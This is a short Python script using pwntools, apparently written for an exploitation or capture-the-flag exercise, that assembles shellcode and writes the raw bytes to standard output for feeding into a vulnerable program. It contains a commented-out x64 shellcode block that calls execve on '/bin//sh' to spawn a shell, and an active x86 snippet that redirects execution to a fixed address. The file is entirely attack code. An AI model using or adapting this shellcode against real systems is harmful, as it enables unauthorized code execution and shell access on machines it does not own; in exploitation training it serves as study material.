from pwn import *
import subprocess
import binascii
import sys


#0x68732F6E69622F2F sh
#0x736C2F6E69622F2F ls

# Shellcode for x64
"""
context.clear()
context.arch = 'amd64'
scs = " xor rdx, rdx;\
        mov rbx, 0x68732F6E69622F2F;\
        push 0;\
        push rbx;\
        mov rdi, rsp;\
        push rdx;\
        push rdi;\
        mov rsi, rsp;\
        mov rax, 0x3B;\
        syscall"
"""

# Shellcode for x86
context.clear()
context.arch = 'x86'
scs = "mov dword ptr [esp], 0x08048540; ret;"

data = asm(scs, os='linux', arch=context.arch)
x = len(data)
#print x
#print ''.join(['\\x%02X'%ord(x) for x in data])
sys.stdout.write(data)
